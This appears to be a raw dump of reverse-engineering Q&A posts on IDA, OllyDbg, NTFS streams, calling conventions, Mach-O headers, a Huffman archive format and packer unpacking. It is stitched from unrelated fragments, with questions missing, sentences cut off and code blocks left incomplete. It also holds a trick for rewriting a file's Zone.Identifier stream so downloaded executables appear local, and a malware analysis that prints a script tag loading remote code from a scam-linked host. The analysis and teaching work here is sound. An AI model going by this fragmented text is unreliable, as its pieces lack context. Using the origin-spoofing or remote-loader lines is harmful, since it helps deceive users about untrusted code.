<p>and from the address difference between the two <code>strcpy</code>s, we assumed an array size of 80. But note that the exact same instructions would have been generated in that case:</p>

<pre><code>char name[160];
strcpy(name+80, ""John"");
strcpy(name, ""Doe"");

","<p>An NTFS file can have <a href=""http://ntfs.com/ntfs-multiple.htm"" rel=""nofollow"">multiple data streams</a>. $DATA is the name of the default stream.</p>

<p>From <a href=""http://en.wikipedia.org/wiki/Fork_%28file_system%29"" rel=""nofollow"">Wikipedia</a>: Internet explorer, (and, according to the german wikipedia, newer versions of Firefox), use the Zone.Identifier stream to store information from where you downloaded the file. You might have seen the ""File Origin: downloaded from internet"" message in a UAC prompt. </p>

<p>You can edit the Zone.Identifier data with notepad. For example, on one of your files that have this attribute, run <code>notepad myfile.exe:Zone.Identifier</code>. This should give you something like</p>

<pre><code>[ZoneTransfer]
ZoneId=3
</code></pre>

<p>Change the 3 to a 0, then save from notepad. Next time you run the file as adminstrator, the ""Origin: Internet"" message will change to ""Origin: this computer's hard disk"".</p>

<p>The answer to your question ""why is it absent on some other files"" is - only NTFS supports this. If you copy a file to a USB stick, SD card, or network storage, the file will lose its stream; when you copy it back, it doesn't magically gain the stream back. So only files that you downloaded via internet explorer (and possibly other browsers) on your NTFS hard disk will have it. Or, of course, files in which you created the stream yourself, like in <code>echo ""this is a fake"" &gt; myfile.exe:Zone.Identifier</code>.</p>

<p>Of course, the only thing this has to do with reverse engineering is that Ollydbg is one of the few tools that tell you if a file as alternate data streams.</p>

<p>Am I barking up the wrong tree or is there something in this line of code questionable?</p>
","<p>This technique uses the fact that when the interrupt instructions INT3 (breakpoint) and INT1 
(single-step) are stepped thru inside a debugger, by default, the exception handler will not be 
invoked since debuggers typically handle the exceptions generated by these interrupts. Thus, 
a packer can set flags inside the exception handler, and if these flags are not set after the INT 
instruction, it means that the process is being debugged. Additionally, kernel32!DebugBreak() 
internally invokes an INT3 and some packers use the said API instead. </p>

<p>You can see in the image below (full-size at <a href=""https://i.imgur.com/fuaKqdk.png"" rel=""nofollow noreferrer"">http://i.imgur.com/fuaKqdk.png</a>) that the DLL's entry point is <code>10807A1C</code>. I've pointed from the entry point's artificial entry in the Exports table (since IDA gets the address from the PE's Entry Point field, not the actual PE Export Table) to the disassembly for the entry point code via arrow #1.</p>

<p>The code at the entry point (named <code>DllEntryPoint()</code> by IDA) calls <code>___DllMainCRTStartup()</code> via arrow #2. Then <code>__DllMainCRTStartup()</code> calls <code>DllMain()</code> via arrow #3.</p>

<p>The two function executed before <code>DllMain()</code> are from VC++ 6's runtime library.</p>

"IDA: Segment Class Name","1057","","<p>As per <a href=""https://www.hex-rays.com/products/ida/support/idadoc/517.shtml"" rel=""nofollow"">IDA Online Help</a>:</p>

<blockquote>
  <p>The segment class name identifies the segment with a class name (such as CODE, FAR_DATA, or STACK). The linker places segments with the same class name into a contiguous area of memory in the runtime memory map.</p>
</blockquote>

<p>IDA has the following predefined segment class names:</p>

<pre><code>    CODE    -       Pure code
    DATA    -       Pure data
    CONST   -       Pure data
    BSS     -       Uninitialized data
    STACK   -       Uninitialized data
    XTRN    -       Extern definitions segment
</code></pre>

<p>As far as I could tell permission on a segment already offer all relevant information.
What is the exact purpose(or applicable usage) of <em>Segment Class Name</em>? How does IDA utilize it internally?</p>
","<p>I have looked through <a href=""https://www.hex-rays.com/products/ida/support/download.shtml"" rel=""nofollow"">IDA SDK</a> and specifically <em>segment.hpp</em> file, and this is what I figured out. IDA has 12 segments types defined based on how those are treated by kernel. In addition, there are several ""fake"" segments, which IDA presumes would not contain code or data. As a result those are completely excluded from disassembly. This is how segment type is defined:</p>

<pre><code>/* 94 */  uchar type;   // Type of the segment. The kernel treats different
                        // segment types differently.
                        // Segments marked with '*' contain no instructions
                        // or data and are not declared as 'segments' in
                        // the disassembly.

#define SEG_NORM        0       // Unknown type, no assumptions
#define SEG_XTRN        1       // * segment with 'extern' definitions
                                //   no instructions are allowed
#define SEG_CODE        2       // code segment
#define SEG_DATA        3       // data segment
#define SEG_IMP         4       // java: implementation segment
#define SEG_GRP         6       // * group of segments
#define SEG_NULL        7       // zero-length segment
#define SEG_UNDF        8       // undefined segment type (not used)
#define SEG_BSS         9       // uninitialized segment
#define SEG_ABSSYM     10       // * segment with definitions of absolute symbols
#define SEG_COMM       11       // * segment with communal definitions
#define SEG_IMEM       12       // internal processor memory &amp; sfr (8051)
</code></pre>

<p>The Class of the segment is ""mapped"" to its type in the following manner:</p>

<pre><code> //                      ""CODE""  -&gt; SEG_CODE
 //                      ""DATA""  -&gt; SEG_DATA
 //                      ""CONST"" -&gt; SEG_DATA
 //                      ""STACK"" -&gt; SEG_BSS
 //                      ""BSS""   -&gt; SEG_BSS
 //                      ""XTRN""  -&gt; SEG_XTRN
 //                      ""COMM""  -&gt; SEG_COMM
 //                      ""ABS""   -&gt; SEG_ABS
</code></pre>

<p>In addition, I have found out that permissions are actually ""figured out"" and set by particular loader modules, which would also set segment types (ergo Classes) based on specifics of the loaded file. </p>

","<p>Depending on the worker model your apache is configured to use its likely a new worker is being spawned to handle your request if your bp isnt hitting. Like Guntram said you can <a href=""https://httpd.apache.org/dev/debugging.html"" rel=""nofollow"">disable forking</a> and put httpd in debug mode by using the <code>-X</code> flag and starting gdb with:</p>

<pre><code>gdb httpd -X

<p>If for some reason you need to debug the multiple worker configured httpd you should use the gdb options <code>set follow-fork-mode ask</code> or <code>set follow-fork-mode child</code> if you know you'd like to follow all forks in advance. (<a href=""https://sourceware.org/gdb/onlinedocs/gdb/Forks.html"" rel=""nofollow"">https://sourceware.org/gdb/onlinedocs/gdb/Forks.html</a>).

"copy/pasting sections of code or hex in Ollydbg","1052","","<p>Is it possible to somehow copy/paste sections of data in the hex dump, or lines of code in the code (top left in CPU window disassembly window)?</p>

<p>Example: cloning a function, and then making some changes.  Another example, copying a section of code that puts arguments on the stack and then calls a function like opening a messagebox, i.e. copying some 4-5 lines.  </p>

<p>I can double click in the code (disassembly) window in the ""command"" column to open the ""assemble"" dialog, copy the text (such as CALL 004026F8), then close it (without changing this instruction) then go to some NOP's or 0's or something, double clicking (""command"" column again) to open the assembly dialog again and pasting it in.  This is ok for one or two instructions, but it would be nice if I could just select several lines and copy/paste them at once.  Or if I could do it in the hex dump window by copying just bytes instead of lines of code.  </p>

<p>I see the ""binary copy"" and ""binary paste"" in the hex dump window but they only do it for one byte, not a selected region.</p>

<p>I see in some videos people noting down addresses and running a separate hex editor program just to do this type of operation.  </p>

<p>By the way, by selecting a region of data in the hex dump, one can right-click ""Open in separate dump window"" to open a window containing just this, and then write this selected data out to a file <a href=""https://stackoverflow.com/questions/34341726/how-to-dump-memory-into-raw-file-in-ollydbg/3437098"">link</a>.  And one can bring in .bin files (not by File-Open but by drag and dropping them in) to a window also.  But I can't see how to copy more than one byte at a time between them.</p>

<p>Using the <code>Xrefs From/To</code> (old option) it shows the clear path: <code>AllocateVolume</code> -> <code>VolumeSortCmp</code> -> <code>CompareVolumeComponents</code> as shown in the screenshot below</p>

<p>Is the proximity viewer malfunctioning or are my expectations off? Or am i doing something wrong here?</p>
","<p>I think that the problem is a misunderstanding of how the Proximity Viewer works. It will not clear out all the other nodes in the graph when finding a path: it simply finds a path and adds the required nodes to the graph. If you want to view only the nodes between AllocateVolume and CompareVolumeComponents, do the following:</p>

<ol>
<li>Navigate to AllocateVolume and press '-'.</li>
<li>Right click on the center node AllocateVolume and select ""Collapse  children"", then, ""Collapse parents"" as well.</li>
<li>Then, right click outside this node in the proximity view and select ""Add name"".</li>
<li>Find ""CompareVolumeComponents"" and add it.</li>
<li>After this step, right click on the AllocateVolume node, select ""Find Path"" and select the only other available node.</li>
</ol>

<p>If everything goes OK, you will have a graph with only the functions required to display a path from AllocateVolume to CompareVolumeComponents. If it does not, there may be some problem with the current code of the Proximity Viewer (in that case, please contact support at Hex-Rays for a fix). Also, you may want to take a look to the ""callgraph"" plugin in the SDK: the algorithm to find paths is pretty much the same and you may get an idea about why it isn't working.</p>

<p>As a side note, a little explanation of how the PV works: The algorithm does not consider a path only calls/jmps as (Q)WinGraph32 does (IIRC) but also consider a path when there are data references. If a function A references, in any way, function B, then the proximity viewer will show that reference (with a gray edge instead of a blue edge). BTW, I'm the guy who wrote it.</p>

"Tracking What Is Done With a Function's Return Value","1051","","<p>I wrote a simple IDA plugin that, after a function call, looks for <code>mov MEM_LOCATION eax</code> and adds a name for the memory where the return value is stored.

Is there a more rigorous way to track where the return value goes besides these heuristics?</p>
","<p>In the static context, this is known as ""data flow analysis"".  For example, Hex-Rays incorporates the return-location information for function calls into its representation of the function so as to determine into which other locations that data flows.  You don't give a lot of detail on what you want to do with this information, but off the top of my head I'd say it could be worthwhile to investigate writing a Hex-Rays plugin.</p>

<p>The script writes a <code>&lt;script src=...&gt;</code> tag at the end, so to know what it is doing, you could change the last <code>document.write</code> to a <code>console.log</code> or other defanging measures to see that this is written out:</p>

<pre><code>&lt;script src=""//srvjs.com/imp/gie462.js?d=«base64»""&gt;&lt;/script&gt;
</code></pre>

<p>Visiting that URL <del>gives ""Whoops, looks like something went wrong."" in HTML</del>, so I guess the script has been inactivated at the moment, or I didn't pass the correct parameters. </p>

<p>If the script is loaded with relative path instead of from <code>srvjs.com</code>, the host becomes <code>js-cdn.com</code> instead. Googling for <code>js-cdn.com</code> gives <a href=""https://thecomputerperson.wordpress.com/2015/07/12/yet-another-microsoft-scam-support-company-getsupportforyourpc-com-righttechnicalsupport-com/"" rel=""nofollow noreferrer"">this blog post</a> which indicates the site is related to scam in 2015. </p>

<p>Note that both <code>srvjs.com/imp/gie462.js</code> and <code>js-cdn.com/imp/gie462.js</code> return the same content, so these two websites should be strongly related. </p>

<p><strong>2.</strong></p>

<p>There isn't much obfuscation, I think your unpacker is just not very good in quality. I just used VS Code's beautifier to <a href=""http://pastebin.com/AsV91hrr"" rel=""nofollow noreferrer"">get this</a>.</p>

<p>The script is long, mainly because it included a lot of libraries. </p>

<ul>
<li><p>The <code>var l = {alphabet: ...}</code> part is a base64 encoding library from <a href=""https://stackoverflow.com/a/24133397/224671"">https://stackoverflow.com/a/24133397/224671</a> (o_O)</p></li>
<li><p>The <code>function() { ... }.call(this)</code> next it is <a href=""http://bestiejs.github.io/json3/"" rel=""nofollow noreferrer"">JSON3</a>. </p></li>
<li><p>The base64 data sent can be seen to be:</p>

<pre><code>    {""k"": ""gie462"",

     ""d"": (current URL),
     ""cr"": (the parameter `cr` of current page)}

<p>which doesn't seem to leak much information about the user before loading the real script (<code>imp/gie462.js</code>). What is done in the real script is yet to be known.</p></li>

","13869"
"Identifying variable args function","1048","","<p>How would a C variable argument function such as <code>printf(char* format, ...)</code> look like when disassembled?</p>

<p>Is it always identified by calling convention, or are there more ways to identify it?</p>
","<p>It is very simple in some architectures, and not very obvious in others. I'll describe a few I'm familiar with.</p>

<h2>SystemV x86_64 (Linux, OS X, BSD)</h2>

<p>Probably the easiest to recognize. Because of the boneheaded decision to specify the number of used XMM registers in <code>al</code>, most vararg functions begin like this:</p>

<pre><code>    push    rbp
    mov     rbp, rsp
    sub     rsp, 0E0h
    mov     [rbp+var_A8], rsi
    mov     [rbp+var_A0], rdx
    mov     [rbp+var_98], rcx
    mov     [rbp+var_90], r8
    mov     [rbp+var_88], r9
    movzx   eax, al
    lea     rdx, ds:0[rax*4]
    lea     rax, loc_402DA1
    sub     rax, rdx
    lea     rdx, [rbp+var_1]
    jmp     rax
    movaps  xmmword ptr [rdx-0Fh], xmm7
    movaps  xmmword ptr [rdx-1Fh], xmm6
    movaps  xmmword ptr [rdx-2Fh], xmm5
    movaps  xmmword ptr [rdx-3Fh], xmm4
    movaps  xmmword ptr [rdx-4Fh], xmm3
    movaps  xmmword ptr [rdx-5Fh], xmm2
    movaps  xmmword ptr [rdx-6Fh], xmm1
    movaps  xmmword ptr [rdx-7Fh], xmm0
loc_402DA1:
</code></pre>

<p>Note how it's using <code>al</code> to determine how many xmm registers to spill onto the stack.</p>

<h2>Windows x64 aka AMD64</h2>

<p>In Win64 it's less obvious, but here's one sign: the registers that correspond to the elliptic parameters are always spilled onto the stack and at positions that line up with the rest of arguments passed on the stack. E.g. here's the <code>printf</code>'s prolog:</p>

<pre><code>  mov     rax, rsp
  mov     [rax+8], rcx
  mov     [rax+10h], rdx
  mov     [rax+18h], r8
  mov     [rax+20h], r9
</code></pre>

<p>Here, <code>rcx</code> contains the fixed <code>format</code> argument, and the elliptic arguments are passed in <code>rdx</code>, <code>r8</code> and <code>r9</code> and then on the stack. We can observe that <code>rdx</code>, <code>r8</code> and <code>r9</code> are stored exactly one after another, and just below the rest of the arguments, which begin at <code>rsp+0x28</code>. The area [rsp+8..rsp+0x28] is reserved <a href=""http://msdn.microsoft.com/en-us/library/ew5tede7.aspx"">exactly for this purpose</a>, but the non-vararg functions often don't store all register arguments there, or reuse that area for local variables. For example, here's a <em>non</em>-vararg function prolog:</p>

<pre><code>  mov     [rsp+10h], rbx
  mov     [rsp+18h], rbp
  mov     [rsp+20h], rsi
</code></pre>

<p>You can see that it's using the reserved area for saving non-volatile registers, and not spilling the register arguments.</p>

<h2>ARM</h2>

<p>ARM calling convention uses <code>R0</code>-<code>R3</code> for the first arguments, so vararg functions need to spill them onto stack to line up with the rest of parameters passed on the stack. Thus you will see <code>R0</code>-<code>R3</code> (or <code>R1</code>-<code>R3</code>, or <code>R2</code>-<code>R3</code> or just <code>R3</code>) being pushed onto stack, which <em>usually</em> does not happen in non-vararg functions. It's not a 100% foolproof indicator - e.g. Microsoft's compiler sometimes pushes <code>R0</code>-<code>R1</code> onto the stack and accesses them using <code>SP</code> instead of moving to other registers and using that. But I think it's a pretty reliable sign for GCC. Here's an example of GCC-compiled function:</p>

<pre><code>STMFD   SP!, {R0-R3}
LDR     R3, =dword_86090
STR     LR, [SP,#0x10+var_14]!
LDR     R1, [SP,#0x14+varg_r0] ; format
LDR     R0, [R3]        ; s
ADD     R2, SP, #0x14+varg_r1 ; arg
BL      vsprintf
LDR     R3, =dword_86094
MOV     R2, #1
STR     R2, [R3]
LDR     LR, [SP+0x14+var_14],#4
ADD     SP, SP, #0x10
RET
</code></pre>

<p>It's obviously a vararg function because it's calling <code>vsprintf</code>, and we can see <code>R0</code>-<code>R3</code> being pushed right at the start (you can't push anything else before that because the potential stack arguments are present at <code>SP</code> and so the <code>R0</code>-<code>R3</code> have to precede them).</p>

"How are dylib files laid out","1046","","<p>My end goal here is to find the Mach-O header in a dylib file.</p>

<p>Here's what I've come up with so far:</p>

<p>All my dylib files have the following first four bytes: 0xcafebabe. Then after 4096 bytes the actual Mach-O header starts, followed by the usual commands and so on.</p>

<p>But 0xcafebabe is also used to identify Java class files. So how do I distinguish between both of those based on the actual content? What are the fields after 0xcafebabe in a dylib file?</p>
","<p>Since a dylib file is just going to be a Mach-O file, you're going to need to understand the header format, which is laid out pretty well in the code itself. You can take a look at the Mach-O parsing functions on Apple's site</p>

<p>What you're seeing is that FAT Header part of the Mach-O file, which is telling you where to find the rest of the of the Mach-O file. This is used to have one file, with two separate architectures inside of it. The FAT header describes where the to find the rest of the data needed by the system running it.</p>

<p>While doing some reversing and forensics work, I created a 010Editor template for parsing through Mach-O files - it might be useful in conjunction with the source from Apple for understanding what is coming after the 0xCAFEBABE and loading you're actual dylib files;</p>

","<p>For various reasons, it is generally not possible to decompile a non-trivial program to the point where it can be correctly recompiled. Among other things, there's a lot of things you can do in bytecode that don't correspond to Java language features, and even in the ideal case, it is hard to restructure certain complex code. </p>

<p>Decompilation is useful for understanding code, but if you want to edit it, you need to learn how to patch things at the bytecode level. The easiest way to do this for APKs is using baksmali. </p>

<p>Running baksmali gives you a directory with a smali file for each class in the dex file. You can then edit the smali to make the changes you want, and run smali to reassemble everything into a new dex file. Then of course you have to add your <code>classes.dex</code> back into the apk, then sign and format it.</p>

Unfortunately, no one has been able to crack the code yet. I'm hoping someone might have at least an idea on what it could be.</p>

<p>Here are a few files that I extracted (the ones in the ""old"" directory are older files that also have a hash that you can use for comparison):

I looked at <a href=""https://github.com/Pupix/lol-wad-parser"" rel=""nofollow noreferrer"">this GitHub project</a> to get started, but the person that wrote the code does not seem to know what that header means either.

At first I thought they might be using a variant of SHA or another hashing algorithm, but I'm no longer sure if that is the case because of the varying length, and I am definitely not a hashing professional.</p>

<p>If it helps, you can also download the ""Wooxy"" program, a League of Legends file extractor/editor program, to extract, edit, and update the game files yourself.</p>

<h1>Paper Abstract</h1>

<blockquote>
  <p>This paper concerns static-analysis algorithms for analyzing binary executables. The aim of the work is to recover intermediate representations (IRs) that are similar to those that can be created for a program written in a high-level language. Our goal is to perform this task for programs such as viruses, worms, and mobile code. For such programs, symbol-table and debugging information is either entirely absent, or cannot be relied upon if present; hence, the analysis described in the paper makes no use of symbol-table/debugging information.</p>
</blockquote>

<p>The main analysis discussed in the paper, called <em>value-set analysis</em>, tracks address-valued and integer-valued quantities simultaneously. It is related to pointer-analysis algorithms that have been developed for programs written in high-level languages, which determine an over-approximation of the set of variables whose addresses each pointer variable can hold. At the same time, value-set analysis is similar to range analysis and other numeric static-analysis algorithms that over-approximate the integer values that each variable can hold.</p>

<p>The techniques described in the paper have been implemented as part of CodeSurfer/x86, a prototype tool for browsing (``surfing''), inspecting, and analyzing x86 executables.</p>

<pre><code>This ABI requires C1 and C2 constructors to return this (instead of being void functions) so that a C3 constructor
can tail call the C1 constructor and the C1 constructor can tail call C2.
Similarly, we require D2 and D1 to return this so that D0 need not save and restore this and D1 can tail call D2 (if
there are no virtual bases). D0 is still a void function.

"Unknown decompression algorithm","1025","","<p>I work on the reverse engineering of the ChessBase archive (.cbv).</p>

<p>I found the general structure of the file and can already decompress some files.</p>

<p>You can see my current work <a href=""https://github.com/antoyo/uncbv"" rel=""noreferrer"">here</a>.</p>

<p>However, some .cbv files that are bigger seems to use a second compression algorithm.</p>

<p>I tried some tools like <code>signsrch</code> to find out what algorithm was used without any luck: it seems to be a custom algorithm.</p>

<p>Here is a <a href=""http://en.chessbase.com/portals/4/files/news/2014/common/cbm/cbm163/CBM163D85.cbv"" rel=""noreferrer"">file</a> that I am able to partly decompress with my <a href=""https://github.com/antoyo/uncbv"" rel=""noreferrer"">tool</a> (my tool will print <code>What to do?</code> when it detects that the unknown compression algorith was used).</p>

<p>Do you have any idea of what compression algorithm is used?</p>

<p>If not, do you have any way of finding it by looking at the compressed file?</p>

<p>I am able to create archives so I can have files that are both compressed and not: I wonder if there is any way to find a compression pattern in such a situation.</p>
","<p>After downloading ChessBase Reader and playing with ProcMon a bit to find the function that reads the archive and writes the data file, i loaded up the whole thing in IDA to analyze it. The data is <a href=""http://en.wikipedia.org/wiki/Huffman_coding"" rel=""nofollow"">Huffman-coded.</a> </p>

<p>Each data block has the following structure. Note that Huffman compression works with bits, not bytes, so each size in the following table is in bits as well. The block length is 16 bits, or 2 bytes, for example.</p>

<pre><code>+----------------------------------------------+
|                                              |
|16 bits - uncompressed block length (len)     |

+-----------+----------------------------------+
|           |                                  |
|Repeat     |  4 bits - length of entry (n)    |
|256        |                                  |
|times      +----------------------------------+
|           |                                  |
|one entry  |  n bits - tree left/right        |
|per byte   |  information for this byte       |
|(0-255)    |                                  |
|           |                                  |
+-----------+----------------------------------+
|                                              |
| Huffman encoded bit sequences. The number of |
| bits isn't stored anywhere, but the number   |
| of sequences, which is equal to the number   |
| of output bytes, is the block length (len)   |
|                                              |
+----------------------------------------------+
</code></pre>

<p>Assuming the word ""foobar"" was coded in this scheme, this would possibly  result in (i made up the bit values for the characters):</p>

<pre><code>+----------------+
|Huffman code for|
|character   is  |
+--------+-------+
|        |       |
| o      |   0   |
| f      |   100 |
| b      |   101 |
| a      |   110 |
| r      |   111 |
|        |       |
+--------+-------+
</code></pre>

<p>This would result in the word foobar being coded as
<code>100 0 0 101 110 111</code>. The length is 6 bytes, or <code>0000 0000 0000 0110</code> in 16 bits.</p>

<p>The bitarray for <code>foobar</code>, formatted to the above table, would read</p>

<pre><code>0000 0000 0000 0110                      (16 bit output length)
.....    array index   0 for byte '\0'
.....    array index   1 for byte '\1'
.....
0011 110 array index  97 for byte 'a'    (3 bits)
0011 101 array index  98 for byte 'b'    (3 bits)
.....
0011 100 array index 102 for byte 'f'    (3 bits)
.....

0011 101 array index 114 for byte 'r'    (3 bits)
.....                                    remaining bit combos - 255

100 0 0 101 110 111                      foobar text
</code></pre>

<p>The implementation builds a binary tree from the code table. When it reads the data, it starts at the root of the tree; each bit moves down the tree, to the left or right, depending on the next bit value. When a leaf is reached, the corresponding byte is being output. This repeats until the length of the output stream is reached.</p>

<p>The related functions from the binary are these:</p>

<p><code>BECAA0</code>: decodes the archive data. Reads 16 bits for the length; then reads the encoding table into two arrays at offsets <code>080A</code> (bits) and <code>0E10</code> (bit lengths) within the decoder class. After this, call <code>BEC930</code> to decode the data bytes.</p>

<p><code>BEBF30</code>: One parameter (number of bits), gets this many bits from the input array. At the end of the function, the word at offset <code>1014</code> has these bits.</p>

<p><code>BEBAD0</code>: Builds the tree from the arrays at <code>080A</code> and <code>0E10</code></p>

<p><code>BEC930</code>: Calls <code>BEBAD0</code> to build the tree, then reads the remaining bits from the input stream. Walks the tree for each bit; emits a byte when a leaf is found. At the end, calls <code>BEBA90</code> to destroy the tree.</p>

<p><code>BEBA90</code>: Recursively delete a node by deleting the left and right children, the the node itself.</p>

<p>I don't think debugging the writer would be easier if you want to read the files; compression has a lot of logic and data structures, and knowing how 'one way' works doesn't neccesarily help you with the other way round. In this case, luckily, its a well known algorithm, but if the algorithm is unknown it can be quite hard to compress effectively if you just know how to decompress.</p>

<li>What is the meaning of this line..?  Is it like a version checking stuff..?</li>
<li>Can I just safely remove this line without affecting the functionality of the code..?</li>
</ol>
","<p>You are looking at binary that is compiled as position-independent code. The <code>call    _i686_get_pc_thunk_bx</code> and the following addition to <code>ebx</code> shows just that. If you take a look at the disassembly, you'll see that the address of the <code>add ebx, 292Eh</code> plus 0x292E will result in the first address of the GOT. That why in the next line, _dso_handle_ptr is addressed in such a ""funny"" way.</p>

<p>IDA however is nice enough to show you this in the disassembly as you would normally only see 0xSOMEADDR[ebx]. </p>

<p>In terms of the second question: that line retrieves a global variable, puts it into <code>eax</code> and then checks if it is zero or not. So, you should not just ""delete"" that line since then the <code>test eax, eax</code> would use some old value of <code>eax</code> (which I am sure you will not like all that much).</p>

I am wondering why it decrements instead of incrementing like in the code, and the the small difference between <code>-Os</code> and <code>-O2</code>.</p>

<p><strong>-Os compiled</strong></p>

","<p>By decrementing, compiler can make use of <code>jne</code> (jump if not equal/zero) which does the comparison (to zero) and jump in a single instruction. In case of incrementing, it would have to do a <code>cmp/test</code> (with 10) and then a conditional jump like <code>jnz/jne</code>. I believe it is a part of optimization.</p>

<p><code>-Os</code> flag optimizes to bring down the code size. The code generated using <code>-Os</code> uses <code>dec ebx</code> instead of <code>sub ebx, 0x1</code>, since <code>dec ebx</code> is a 2-byte instruction while <code>sub ebx, 0x1</code> is a 3-byte instruction (Note the address at which the next instruction begins). That explains the small difference.</p>

"Why doesn't Olly's analyzation work properly in this code section?","1021","","<p>I'm not sure if there are any legal hinderances to me asking this question, so if asking for unpacking advice is against the rules I apologize.</p>

<p>I am new to reverse engineering and trying to manually unpack a PEtite 2.2/2.3 as a learning experience and have been trying to follow this guide: <a href=""http://users.freenet.am/~softland/tutorials/Petite.v2.3.MUP.txt"" rel=""nofollow noreferrer"">http://users.freenet.am/~softland/tutorials/Petite.v2.3.MUP.txt</a>. The program I'm unpacking is the original PEtite packer itself.</p>

<p>I have disabled passing on exceptions as it feels like cheating and I haven't fully grasped how exceptions work in this context, seemingly used here to derail the debugger, so I'd like to know why and how to work around it myself. I've come to this part in the guide:</p>

<pre><code>and this exception program generates for jumping to exception handler, so at that line put
breakpoint on exception handler (goto to 4164E3 and press F2), then press SHIFT+F9 and
you are at the beginning of exception handle
</code></pre>

<p>When using OllyDbg 1.10 (non-patched), this is what I find at the address of the exception handler (this address is also where Olly said the OEP would be when I tried out the auto-unpacker SFX ability):</p>

<p><img src=""https://i.stack.imgur.com/V6AAr.png"" alt=""enter image description here""></p>

<p>In the guide it says that I should find the line <code>004164E3 CALL    PETGUI.00416537</code> here. As you can see there is really nothing here, however it was the address I always ended up at no matter the method I tried to use (or saw in tutorials etc.), so I did a process dump and suddenly I got this:</p>

<p><img src=""https://i.stack.imgur.com/zAa8k.png"" alt=""enter image description here""></p>

<p>Now it struck me that since the program is self-modifying that might naturally confuse Olly, so I told Olly to re-analyze the code (before dumping the process), and I ended up with this:</p>

<p><img src=""https://i.stack.imgur.com/AcIbr.png"" alt=""enter image description here""></p>

<p>I got the expected result, but there's something missing... the <code>CALL</code> instruction can be seen in the opcode section but it hasn't been parsed by Olly. Now to my questions:</p>

<ol>
<li>Why doesn't Olly parse this <code>CALL</code> instruction properly?</li>
<li>How come <code>E8 4F000000</code> somehow magically becomes <code>CALL 416537</code>? I don't see any <code>416537</code> in the opcodes. Found this answered here, leaving it for reference: <a href=""https://stackoverflow.com/questions/10376787/need-help-understanding-e8-asm-call-instruction-x86"">https://stackoverflow.com/questions/10376787/need-help-understanding-e8-asm-call-instruction-x86</a>.</li>
<li>At the <code>MOVS</code> instruction where the exception is raised before ending up in the exception handler, if I press <code>Shift-F7</code> or <code>Shift-F8</code> to single-step instead of <code>Shift-F9</code> I somehow end up at 4E3137 which is full of <code>ADD BYTE PTR DS:[EAX], AL</code> instructions, presumably an area of filler instructions that will later be overwritten. How come I ended up here? If I try to keep stepping I'm told <code>EIP</code> is set to <code>00000000</code> and can't proceed. This seems to be the case whenever I choose to exception-single step; errors show up that would be smoothly ignored if I had just used <code>Shift-F9</code>.</li>
</ol>

<p>I have the same problem in OllyDbg 2.01 aswell.</p>
","<p>Because the code at 0x4164e3 is never referenced in a CALL or JMP instruction, but (probably) used as data somewhere else (as you said the program is self-modifying), Olly thinks it's data, and has no reason to assume there's code there. See <a href=""https://stackoverflow.com/questions/13812554/in-ollydbg-how-do-you-force-hint-disassembly-at-a-location"">https://stackoverflow.com/questions/13812554/in-ollydbg-how-do-you-force-hint-disassembly-at-a-location</a> for how to make sure olly treats that address as code.</p>

<p>(In case the link goes away: Right Click -> Analysis -> During Next analysis, treat selection as -> Command, Or at least ""remove analysis from section"" to tell olly NOT to assume data.)</p>

<p>The problem with single-stepping exception handlers is: If you do any kind of single-stepping, the debugger will place a breakpoint at the next instruction, execute the code at the current instruction, and hope for the breakpoint to return control to the debugger. However, the exception will call the exception handler, but the debugger doesn't even know the instruction is going to raise an exception, so it can't put the breakpoint at the exception handler's address. So, your single-step executes the exception handler (without returning to the debugger), which probably checks for the breakpoint after the instruction it came from (to actively detect a debugger) and, if it detects a debugger, jumps to ""nowhere"" to make the program crash/confuse the debugger user.</p>

<p>There are lots of explanations on the internet that are more thorough than what i could write in a short answer, googling for ""exception handler single step"" brings up a few nice examples.</p>

","<p>Depends on what you would call a disadvantage. This kind of code-relict often results from a function that's present in source code, but doesn't ever get called*, so IDA didn't assign a name to it. If this is the case, you:</p>

<ul>
<li>generally don't want to include the function in your analysis, because the program never uses it anyways</li>
<li>can search for a longer sequence of functions that are unused**, which might identify whole source files that got linked in accidentially but aren't used in the program</li>
<li>can use the space of these functions for code caves that ""enhance"" the program's functionality; for example, i sometimes use them for a sequence of open/write/close calls that log some intermediate values.</li>

<p>You sabotage this by making unused functions real functions, which may or may not be important to your use case.</p>

<p>(*) However, the function might be a class method, which is referenced from the vtable, but never called directly, which misleads IDA</p>

<p>(**) If you have two functions <code>a</code> and <code>b</code>, both of which get never called from the outside, but <code>a</code> calls <code>b</code>, IDA will still give <code>b</code> a <code>sub_</code> name, which interferes with identifying unused functions</p>

<p>Basically there are three recovered symbols in data section, and I want to collect these information in a format like this:</p>

<pre><code>0x804a018 : sub_804847b
0x804a01dc : _strchr
0x804a020 : sub_80484AE
</code></pre>

<p>I am thinking to traverse all the memory address of a binary's data sections, and check the content of each address, to see whether it is a recovered symbol.  </p>

<p>But basically how to read a suspicious symbol when iterating addresses? I read the <a href=""https://www.hex-rays.com/products/ida/support/idadoc/162.shtml"" rel=""nofollow noreferrer""><code>idc</code></a> interface, but I just cannot find any the correct api to do so. Could anyone help me on this issue? I appreciate that.</p>

<p>------------------------ explain ------------------------</p>

<p>I didn't get an answer in that post, in addition, I think what I explained in that post is somehow misleading.</p>
","<p>As far as I understood your question, you will need the following IDAPython apis:</p>

<ul>
<li>Getting a content from specific memory address : idc.Dword(address) or idc.Qword(address) - you should choose the function according to the pointer size.</li>
<li>Obtaining a name of the address: idc.Name(address)</li>
</ul>

<p>All the mentioned IDAPython apis has the similar things in idc </p>

<p>So, for your specific example you'll get the desired output as follows (IDAPython):</p>

<pre><code>import idc
addresses = [0x804a018, 0x804a01dc ,0x804a020 ]

for a in addresses:
    print hex(a),"" : "", idc.Name(idc.Dword(a))
</code></pre>

<p>Filtering the data in the .data section is completely different story.</p>

<p>For example you can do the following (it is not 100% correct):</p>

<pre><code>import idc

segstart = your_code_segment_start
segend = your_code_segment_end
ptrstep = your_system_pointer_size_in_bytes

for a in range(segstart, segend, ptrstep):
    data = idc.Dword(a) #replace with qword if working with 64 bit)
    if a &lt; segstart or a &gt;= segend:
        continue
    if not idc.Name(data) is None:
        print hex(a), "" --&gt; "", idc.Name(data)

"Reliable algorithm to extract overlay of a PE","1003","","<p>I write a Portable Executable (PE) library that also provides finding the starting offset of the overlay (appended data to the PE that is not mapped into memory).</p>

<p>My algorithm finding the overlay offset looks like this so far:</p>

<pre><code>public long getOverlayOffset() throws IOException {
        if (offset == null) {
            SectionTable table = data.getSectionTable();
            offset = 0L;

                long pointerToRaw = section.get(POINTER_TO_RAW_DATA);
                long sizeOfRaw = section.get(SIZE_OF_RAW_DATA);
